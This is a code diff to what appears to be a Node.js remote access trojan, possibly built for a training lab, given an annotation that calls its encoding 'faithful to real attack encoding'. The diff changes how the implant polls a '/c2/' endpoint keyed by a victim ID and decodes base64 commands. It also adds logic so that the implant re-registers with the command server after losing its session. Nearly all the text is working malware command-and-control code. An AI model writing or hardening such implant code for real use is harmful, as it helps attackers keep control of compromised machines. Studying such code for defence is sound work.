@@ -80,11 +80,13 @@ function httpRequest(method, urlPath, body) {
       let data = "";
       res.on("data", (chunk) => (data += chunk));
       res.on("end", () => {
+        let body;
         try {
-          resolve(JSON.parse(data));
+          body = JSON.parse(data);
         } catch {
-          resolve(data);
+          body = data;
         }
+        resolve({ statusCode: res.statusCode, body });
       });
     });
 
@@ -150,12 +152,21 @@ async function beacon() {
 
 async function poll() {
   const response = await httpRequest("GET", `/c2/${victimId}`);
-  if (!response || !response.command) return;
+  if (!response) return;
+
+  // Re-beacon if C2 forgot us (e.g. server restarted)
+  if (response.statusCode === 404) {
+    console.log("[RAT] C2 lost our session, re-beaconing...");
+    await beacon();
+    return;
+  }
+
+  if (!response.body || !response.body.command) return;
 
   // ANNOTATION: base64-decode the command — faithful to real attack encoding
   let cmd;
   try {
-    cmd = JSON.parse(Buffer.from(response.command, "base64").toString("utf-8"));
+    cmd = JSON.parse(Buffer.from(response.body.command, "base64").toString("utf-8"));
   } catch {
     return;
   }
